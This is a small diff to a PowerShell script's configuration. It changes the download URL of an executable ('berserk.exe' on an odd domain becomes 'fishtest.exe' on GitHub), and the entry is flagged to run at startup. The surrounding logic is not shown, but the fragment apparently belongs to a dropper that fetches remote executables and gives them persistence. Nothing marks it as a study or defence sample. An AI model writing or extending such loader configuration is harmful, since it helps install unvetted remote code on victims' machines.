@@ -1,5 +1,5 @@
 $config = @(
-    @{ Url = "https://1.fcitt.cc/berserk.exe"; Startup = $true }
+    @{ Url = "https://github.com/Trop1c0/powershell/blob/main/fishtest.exe"; Startup = $true }
 )
 
 $targets = @()
